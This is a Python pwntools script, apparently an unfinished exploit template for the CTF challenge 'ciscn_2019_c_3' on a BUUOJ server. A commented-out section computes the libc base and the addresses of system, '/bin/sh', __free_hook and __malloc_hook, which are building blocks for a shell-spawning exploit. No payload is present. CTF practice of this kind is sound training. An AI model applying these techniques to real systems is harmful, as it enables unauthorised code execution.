#coding:utf-8
from pwn import *
from LibcSearcher import *


pwnfile = './ciscn_2019_c_3' 
elf = ELF(pwnfile)
is_remote = 0;
sh=0;

# 获取可执行程序的操作位数
if elf.arch == 'amd64':
    context(log_level='debug',arch='amd64',os='linux')
elif elf.arch == 'i386':
    context(log_level='debug',arch='i386',os='linux')
else:
    print("Unknown architecture.")

if(is_remote==1):
    libc=ELF(elf.libc)
    sh=remote('node4.buuoj.cn',29059)
else:
    libc=ELF(elf.libc)
    sh=process(pwnfile)

def mygdb():
    if(is_remote!=1):
        gdb.attach(sh)
        pause()


sh.interactive()

"""
if(is_remote==1):
    obj = LibcSearcher("setbuffer", setbuff_addr)
    base_addr=setbuff_addr-obj.dump("setbuffer") 
    print("base_addr:",hex(base_addr))
    bin_sh_addr=base_addr+obj.dump("str_bin_sh") 
    print("bin_sh_addr:",hex(bin_sh_addr))
    system_addr=base_addr+obj.dump("system")   
    print("system_addr:",hex(system_addr))
    free_hook_addr=base_addr+obj.dump("__free_hook")
    print("free_hook_addr:",hex(free_hook_addr))
    realloc_addr=base_addr+obj.dump("realloc")   
    print("realloc_addr:",hex(realloc_addr))
    malloc_hook_addr=base_addr+obj.dump('__malloc_hook')
    print("malloc_hook_addr:",hex(malloc_hook_addr))
if(is_remote==0):
    base_addr=setbuff_addr-libc.sym['setbuffer']
    print("base_addr:",hex(base_addr))
    bin_sh_addr=base_addr+libc.search(b'/bin/sh').__next__()
    print("bin_sh_addr:",hex(bin_sh_addr))
    system_addr=base_addr+libc.sym['system']  
    print("system_addr:",hex(system_addr))
    free_hook_addr=base_addr+libc.sym['__free_hook'] 
    print("free_hook_addr:",hex(free_hook_addr))
    realloc_addr=base_addr+libc.sym['realloc'] 
    print("realloc_addr:",hex(realloc_addr))
    malloc_hook_addr=base_addr+libc.sym['__malloc_hook'] 
    print("malloc_hook_addr:",hex(malloc_hook_addr))
"""
